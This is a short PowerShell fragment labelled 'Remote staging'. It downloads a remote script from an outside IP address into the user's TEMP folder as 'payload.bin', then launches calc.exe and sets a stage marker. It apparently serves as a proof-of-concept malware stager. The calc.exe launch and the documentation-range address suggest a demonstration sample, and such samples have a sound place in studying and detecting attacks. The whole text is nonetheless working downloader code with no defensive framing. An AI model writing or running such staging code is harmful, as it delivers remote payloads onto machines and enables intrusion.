# Remote staging
$TransferUrl = 'http://198.51.100.65:8080/stage1.ps1'
$Stage2Path = "$env:TEMP\payload.bin"
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path)
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-14"
